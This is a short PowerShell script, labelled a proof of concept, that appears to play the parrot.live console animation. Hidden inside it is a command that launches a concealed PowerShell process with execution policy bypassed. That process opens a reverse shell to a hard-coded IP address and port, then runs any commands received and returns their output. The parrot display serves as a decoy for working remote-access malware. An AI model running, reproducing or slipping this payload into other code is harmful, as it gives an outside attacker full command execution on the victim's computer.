Add-Type -AssemblyName PresentationFramework
$Title="test"
$Message="this is a poc"

$request = [System.Net.HttpWebRequest]::Create("http://parrot.live");
$response = $request.GetResponse();
$receiveStream = $response.GetResponseStream();
$readStream = [System.IO.StreamReader]::new($receiveStream);

powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('162.210.192.209', 47580);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

[console]::TreatControlCAsInput = $true;
$initialForegroundColor = [Console]::ForegroundColor;
while ($line = $readStream.ReadLine()) {
  if ([Console]::KeyAvailable) {
    $key = [System.Console]::ReadKey($true)
    if (($key.modifiers -band [ConsoleModifiers]"control") -and ($key.key -eq "C"))
    {
      break;
    }
  }

  [Console]::WriteLine($line);
}

$readStream.Close();
$receiveStream.Close();
$request.Abort();
[console]::TreatControlCAsInput = $false;
[Console]::ForegroundColor = $initialForegroundColor;
